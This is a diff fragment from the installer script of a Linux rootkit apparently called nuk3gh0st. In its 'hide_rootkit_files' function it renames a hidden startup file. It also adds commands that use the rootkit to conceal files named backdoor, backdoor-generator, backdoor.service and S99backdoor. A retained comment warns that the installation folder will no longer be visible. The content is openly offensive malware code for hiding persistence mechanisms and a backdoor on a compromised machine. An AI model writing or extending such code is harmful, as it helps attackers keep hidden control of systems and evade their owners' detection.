@@ -47,8 +47,15 @@ function hide_rootkit_files {
         nuk3gh0st --hide-file=nuk3gh0st.startup
         #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.service${endColor}"
         nuk3gh0st --hide-file=nuk3gh0st.service
-	#echo -e "   ${purple} cmd: nuk3gh0st --hide-file=S99nuk3gh0st.startup${endColor}"
-        nuk3gh0st --hide-file=S99nuk3gh0st.startup
+	#echo -e "   ${purple} cmd: nuk3gh0st --hide-file=S98nuk3gh0st.startup${endColor}"
+        nuk3gh0st --hide-file=S98nuk3gh0st.startup
+	
+	nuk3gh0st --hide-file=S99backdoor
+	nuk3gh0st --hide-file=backdoor
+	nuk3gh0st --hide-file=backdoor-generator
+	nuk3gh0st --hide-file=backdoor.service
+	
+	
         #echo ""
 
         #echo -e "${yellow}WARNING: you won't be able to see the installation folder"
